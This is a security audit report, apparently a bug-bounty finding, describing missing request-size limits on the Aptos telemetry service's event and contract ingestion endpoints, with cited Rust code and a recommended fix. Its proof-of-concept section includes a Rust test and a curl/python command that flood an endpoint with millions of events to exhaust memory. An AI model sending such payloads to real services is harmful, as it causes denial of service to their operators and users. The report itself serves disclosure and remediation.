# Audit Report

## Title
Missing Content-Length Limit on Telemetry Event Ingestion Endpoints Allows Memory Exhaustion Attack

## Summary
The telemetry service's custom event ingestion endpoints lack explicit HTTP body size limits, allowing authenticated attackers to send arbitrarily large JSON payloads with millions of events. This causes memory exhaustion during deserialization, leading to service crashes or severe performance degradation.

## Finding Description
The `custom_event_ingest` endpoint in the telemetry service uses `warp::body::json()` without an explicit `content_length_limit()` filter, unlike other similar endpoints in the same service. [1](#0-0) 

The `TelemetryDump` struct contains an unbounded `Vec<TelemetryEvent>` field with no size validation: [2](#0-1) 

In contrast, other ingestion endpoints in the same service properly enforce size limits using `MAX_CONTENT_LENGTH` (1 MB): [3](#0-2) [4](#0-3) [5](#0-4) 

The vulnerability exists because warp 0.3.5 (used in this codebase) does not impose a default size limit on `body::json()`: [6](#0-5) 

**Attack Flow:**
1. Attacker authenticates as a validator, VFN, or PFN (which are allowed node types for this endpoint)
2. Attacker crafts a malicious `TelemetryDump` JSON payload with millions of events (e.g., 10 million minimal events = ~300 MB)
3. POST request to `/api/v1/ingest/custom-event` with the malicious payload
4. Warp reads the entire body into memory
5. Serde attempts to deserialize millions of events into the `Vec<TelemetryEvent>`
6. Memory exhaustion causes service crash or severe slowdown

The same vulnerability exists in custom contract ingestion endpoints: [7](#0-6) [8](#0-7) [9](#0-8) 

This breaks **Invariant #9**: "All operations must respect gas, storage, and computational limits." The telemetry service accepts unbounded inputs from authenticated nodes without enforcing memory/resource constraints.

## Impact Explanation
**High Severity** per Aptos Bug Bounty criteria:
- **Validator node slowdowns**: Telemetry service crashes affect monitoring of validator infrastructure
- **API crashes**: Service becomes unavailable, disrupting observability of the entire network
- **Repeated exploitation**: Authenticated attackers (malicious validators, compromised nodes) can repeatedly crash the service

While the telemetry service is not a consensus-critical component, its availability is important for:
- Network health monitoring
- Validator performance tracking  
- Security incident detection
- Operational visibility

Service disruption impairs the ability to detect and respond to attacks on the actual blockchain infrastructure.

## Likelihood Explanation
**High Likelihood**:
- Attack requires only authenticated node access (validators, VFNs, PFNs can all access this endpoint)
- No special privileges needed beyond standard node authentication
- Simple to execute: craft large JSON, send single HTTP request
- No rate limiting visible on this endpoint
- Repeatable attack with minimal effort

Any compromised node or malicious node operator can exploit this vulnerability to disrupt telemetry services.

## Recommendation
Add explicit `content_length_limit()` filters to all affected endpoints, consistent with other endpoints in the service:

**Fix for custom_event.rs:**
```rust
pub fn custom_event_ingest(context: Context) -> BoxedFilter<(impl Reply,)> {
    warp::path!("ingest" / "custom-event")
        .and(warp::post())
        .and(context.clone().filter())
        .and(with_auth(context, vec![
            NodeType::Validator,
            NodeType::ValidatorFullNode,
            NodeType::PublicFullNode,
            NodeType::Unknown,
            NodeType::UnknownValidator,
            NodeType::UnknownFullNode,
        ]))
        .and(warp::body::content_length_limit(MAX_CONTENT_LENGTH))  // ADD THIS LINE
        .and(warp::body::json())
        .and(warp::header::optional("X-Forwarded-For"))
        .and_then(handle_custom_event)
        .boxed()
}
```

Apply the same fix to custom_contract_ingest.rs endpoints (lines 35, 149, 304).

Additionally, consider adding application-level validation in `validate_custom_event_body()` to enforce a maximum event count (e.g., 1000 events per dump):

```rust
fn validate_custom_event_body(
    claims: &Claims,
    body: &TelemetryDump,
) -> anyhow::Result<(), Rejection> {
    // ... existing checks ...
    
    const MAX_EVENTS_PER_DUMP: usize = 1000;
    if body.events.len() > MAX_EVENTS_PER_DUMP {
        return Err(reject::custom(ServiceError::bad_request(
            CustomEventIngestError::TooManyEvents.into(),
        )));
    }
    
    Ok(())
}
```

## Proof of Concept
```rust
// PoC: Demonstrates memory exhaustion attack
use reqwest::Client;
use serde_json::json;

#[tokio::test]
async fn test_memory_exhaustion_attack() {
    // Assume we have a valid JWT token for authentication
    let jwt_token = "VALID_JWT_TOKEN";
    
    // Create a payload with 1 million events
    let mut events = Vec::new();
    for i in 0..1_000_000 {
        events.push(json!({
            "name": format!("event_{}", i),
            "params": {}
        }));
    }
    
    let payload = json!({
        "client_id": "attacker",
        "user_id": "0x1234", // Must match authenticated peer_id
        "timestamp_micros": "1234567890",
        "events": events
    });
    
    let client = Client::new();
    let response = client
        .post("https://telemetry-service/api/v1/ingest/custom-event")
        .bearer_auth(jwt_token)
        .json(&payload)
        .send()
        .await;
    
    // This request will cause severe memory exhaustion on the server
    // Expected: Service slowdown or crash
    // Actual: No payload size enforcement, full deserialization attempted
}
```

**Manual Test:**
1. Authenticate as a validator node to obtain JWT token
2. Generate large JSON file: `python3 -c "import json; print(json.dumps({'client_id':'x','user_id':'PEER_ID','timestamp_micros':'123','events':[{'name':'e','params':{}} for _ in range(5000000)]}))" > large_payload.json`
3. Send request: `curl -X POST -H "Authorization: Bearer $JWT" -H "Content-Type: application/json" -d @large_payload.json https://telemetry-service/api/v1/ingest/custom-event`
4. Observe service memory consumption spike and potential crash

## Notes
The vulnerability affects multiple endpoints across both the main custom event ingestion and custom contract ingestion paths. The inconsistency in applying `content_length_limit()` suggests this was an oversight rather than intentional design. The fix is straightforward and should be applied uniformly across all HTTP body ingestion endpoints in the telemetry service.

### Citations

**File:** crates/aptos-telemetry-service/src/custom_event.rs (L25-41)
```rust
pub fn custom_event_ingest(context: Context) -> BoxedFilter<(impl Reply,)> {
    warp::path!("ingest" / "custom-event")
        .and(warp::post())
        .and(context.clone().filter())
        .and(with_auth(context, vec![
            NodeType::Validator,
            NodeType::ValidatorFullNode,
            NodeType::PublicFullNode,
            NodeType::Unknown,
            NodeType::UnknownValidator,
            NodeType::UnknownFullNode,
        ]))
        .and(warp::body::json())
        .and(warp::header::optional("X-Forwarded-For"))
        .and_then(handle_custom_event)
        .boxed()
}
```

**File:** crates/aptos-telemetry-service/src/types/telemetry.rs (L15-22)
```rust
/// A useful struct for serializing a telemetry dump
#[derive(Debug, Serialize, Deserialize, Clone)]
pub struct TelemetryDump {
    pub client_id: String,
    pub user_id: String,
    pub timestamp_micros: String,
    pub events: Vec<TelemetryEvent>,
}
```

**File:** crates/aptos-telemetry-service/src/log_ingest.rs (L23-39)
```rust
pub fn log_ingest(context: Context) -> BoxedFilter<(impl Reply,)> {
    warp::path!("ingest" / "logs")
        .and(warp::post())
        .and(context.clone().filter())
        .and(with_auth(context, vec![
            NodeType::Validator,
            NodeType::ValidatorFullNode,
            NodeType::PublicFullNode,
            NodeType::UnknownFullNode,
            NodeType::UnknownValidator,
        ]))
        .and(warp::header::optional(CONTENT_ENCODING.as_str()))
        .and(warp::body::content_length_limit(MAX_CONTENT_LENGTH))
        .and(warp::body::aggregate())
        .and_then(handle_log_ingest)
        .boxed()
}
```

**File:** crates/aptos-telemetry-service/src/prometheus_push_metrics.rs (L22-38)
```rust
pub fn metrics_ingest(context: Context) -> BoxedFilter<(impl Reply,)> {
    warp::path!("ingest" / "metrics")
        .and(warp::post())
        .and(context.clone().filter())
        .and(with_auth(context, vec![
            NodeType::Validator,
            NodeType::ValidatorFullNode,
            NodeType::PublicFullNode,
            NodeType::UnknownValidator,
            NodeType::UnknownFullNode,
        ]))
        .and(warp::header::optional(CONTENT_ENCODING.as_str()))
        .and(warp::body::content_length_limit(MAX_CONTENT_LENGTH))
        .and(warp::body::bytes())
        .and_then(handle_metrics_ingest)
        .boxed()
}
```

**File:** crates/aptos-telemetry-service/src/constants.rs (L4-5)
```rust
/// The maximum content length to accept in the http body.
pub const MAX_CONTENT_LENGTH: u64 = 1024 * 1024;
```

**File:** Cargo.toml (L858-858)
```text
warp = { version = "0.3.5", features = ["tls"] }
```

**File:** crates/aptos-telemetry-service/src/custom_contract_ingest.rs (L29-38)
```rust
pub fn metrics_ingest(context: Context) -> BoxedFilter<(impl Reply,)> {
    warp::path!("custom-contract" / String / "ingest" / "metrics")
        .and(warp::post())
        .and(context.clone().filter())
        .and(with_custom_contract_auth(context.clone()))
        .and(warp::header::optional("content-encoding"))
        .and(warp::body::bytes())
        .and_then(handle_metrics_ingest)
        .boxed()
}
```

**File:** crates/aptos-telemetry-service/src/custom_contract_ingest.rs (L143-152)
```rust
pub fn log_ingest(context: Context) -> BoxedFilter<(impl Reply,)> {
    warp::path!("custom-contract" / String / "ingest" / "logs")
        .and(warp::post())
        .and(context.clone().filter())
        .and(with_custom_contract_auth(context.clone()))
        .and(warp::header::optional("content-encoding"))
        .and(warp::body::bytes())
        .and_then(handle_log_ingest)
        .boxed()
}
```

**File:** crates/aptos-telemetry-service/src/custom_contract_ingest.rs (L299-307)
```rust
pub fn custom_event_ingest(context: Context) -> BoxedFilter<(impl Reply,)> {
    warp::path!("custom-contract" / String / "ingest" / "custom-event")
        .and(warp::post())
        .and(context.clone().filter())
        .and(with_custom_contract_auth(context.clone()))
        .and(warp::body::json())
        .and_then(handle_custom_event_ingest)
        .boxed()
}
```
